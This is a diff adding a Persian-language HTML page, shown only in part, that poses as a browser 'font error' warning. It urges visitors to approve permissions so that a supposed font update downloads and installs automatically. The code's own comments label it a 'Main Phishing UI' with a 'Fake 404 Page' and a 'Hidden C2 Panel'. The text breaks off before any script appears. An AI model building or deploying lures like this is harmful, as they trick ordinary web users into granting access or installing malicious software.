@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خطای فونت – به‌روزرسانی ضروری</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="theme-color" content="#e63946">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0d0d1a; --card: rgba(18,18,35,0.97); --accent: #e63946; --text: #f1faee;
+            --warn: #f77f00; --success: #06d6a0; --border: #2a2a4a; --glow: #e6394644;
+            --font-primary: 'Vazirmatn', 'Roboto', system-ui, sans-serif;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: var(--bg); color: var(--text); font-family: var(--font-primary);
+            height: 100vh; overflow: hidden; perspective: 1400px; display: flex;
+            justify-content: center; align-items: center; position: relative; font-weight: 400;
+        }
+
+        .bg-3d {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, #1d1d35 0%, #0d0d1a 80%);
+            overflow: hidden; z-index: -2;
+        }
+        .bg-3d::before, .bg-3d::after {
+            content: ''; position: absolute; width: 800px; height: 800px;
+            background: conic-gradient(from 0deg, transparent, var(--glow), transparent);
+            border-radius: 50%; filter: blur(100px); opacity: 0.6;
+            animation: rotate 28s linear infinite;
+        }
+        .bg-3d::before { top: -300px; left: -300px; animation-duration: 32s; }
+        .bg-3d::after { bottom: -300px; right: -300px; animation-duration: 38s; animation-direction: reverse; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .container {
+            width: 100%; max-width: 520px; padding: 20px; transform-style: preserve-3d;
+            animation: float 7s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotateX(0); }
+            50% { transform: translateY(-18px) rotateX(4deg); }
+        }
+        .card {
+            background: var(--card); border-radius: 24px; padding: 40px; box-shadow:
+                0 35px 90px rgba(0,0,0,0.85),
+                0 0 50px var(--glow),
+                inset 0 0 35px rgba(230,57,70,0.08);
+            border: 1px solid var(--border); text-align: center;
+            position: relative; overflow: hidden; backdrop-filter: blur(14px);
+            transform-style: preserve-3d;
+        }
+        .card::before {
+            content: ''; position: absolute; top: -60%; left: -60%; width: 220%; height: 220%;
+            background: linear-gradient(45deg, transparent, var(--glow), transparent);
+            transform: rotate(-45deg); animation: shine 10s infinite;
+            opacity: 0.25;
+        }
+        @keyframes shine { 0% { transform: translateX(-120%) translateY(-120%) rotate(-45deg); } 100% { transform: translateX(120%) translateY(120%) rotate(-45deg); } }
+
+        .logo {
+            font-size: 5.5rem; margin-bottom: 24px; text-shadow: 0 0 25px var(--glow);
+            animation: pulse 2.2s infinite;
+        }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.06);} }
+
+        h1 {
+            font-size: 1.85rem; margin: 16px 0; color: var(--accent); font-weight: 700;
+            letter-spacing: -0.5px; text-shadow: 0 0 15px var(--glow);
+        }
+        .subtitle {
+            font-size: 1.1rem; color: var(--warn); font-weight: 600; margin: 12px 0;
+            letter-spacing: 0.3px;
+        }
+        p {
+            font-size: 1.02rem; line-height: 1.85; color: #d1d1e0; margin: 18px 0;
+            font-weight: 400; text-align: justify; direction: rtl;
+        }
+        .highlight {
+            color: var(--success); font-weight: 600;
+        }
+        .btn {
+            background: var(--accent); color: #fff; border: none; padding: 18px 28px;
+            margin: 14px 10px; border-radius: 16px; font-weight: 600; cursor: pointer;
+            width: calc(100% - 20px); transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+            font-size: 1.15rem; display: flex; align-items: center; justify-content: center; gap: 14px;
+            box-shadow: 0 12px 30px rgba(230,57,70,0.35), inset 0 0 18px rgba(255,255,255,0.12);
+            position: relative; overflow: hidden; font-family: inherit;
+        }
+        .btn::before {
+            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
+            transition: 0.7s;
+        }
+        .btn:hover::before { left: 100%; }
+        .btn:hover {
+            background: #c1121f; transform: translateY(-5px) scale(1.04);
+            box-shadow: 0 18px 40px rgba(230,57,70,0.55);
+        }
+        .status {
+            margin-top: 24px; font-size: 1rem; color: var(--success); opacity: 0;
+            transition: opacity 0.7s; font-weight: 500;
+        }
+        .status.show { opacity: 1; }
+        .hidden { display: none !important; }
+        .device-info { font-size: 0.82rem; color: #999; margin-top: 28px; word-break: break-all; }
+
+        /* Fake 404 Page – Persian */
+        .error-404 {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #0f0f1f; color: #ccc; font-family: 'Segoe UI', Tahoma, sans-serif;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            text-align: center; z-index: 99999; padding: 40px; line-height: 1.8;
+        }
+        .error-404 h1 { font-size: 6rem; color: #e63946; margin: 0; }
+        .error-404 p { font-size: 1.3rem; max-width: 600px; }
+        .error-404 .code { font-family: monospace; background: #222; padding: 8px 16px; border-radius: 8px; color: #0f0; }
+
+        /* Hidden C2 Panel */
+        .c2-panel { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- 3D Background -->
+<div class="bg-3d"></div>
+
+<!-- Main Phishing UI -->
+<div class="container" id="main-ui">
+    <div class="card">
+        <div class="logo">Warning</div>
+        <h1>خطای فونت مرورگر</h1>
+        <p class="subtitle">مرورگر شما از فونت‌های جدید پشتیبانی نمی‌کند</p>
+        <p>
+            به دلیل <span class="highlight">عدم پشتیبانی از فونت‌های پیشرفته</span> مورد استفاده در این وبسایت،
+            محتوای صفحه به درستی نمایش داده نمی‌شود.<br><br>
+            برای رفع این مشکل، لطفاً <span class="highlight">دسترسی‌های زیر را تأیید کنید</span> تا
+            بسته‌ی به‌روزرسانی فونت به صورت خودکار دانلود و نصب شود.<br><br>
+            <strong>پس از ۶۰ ثانیه، صفحه را مجدداً باز کنید.</strong>
+        </p>
+        <p style...
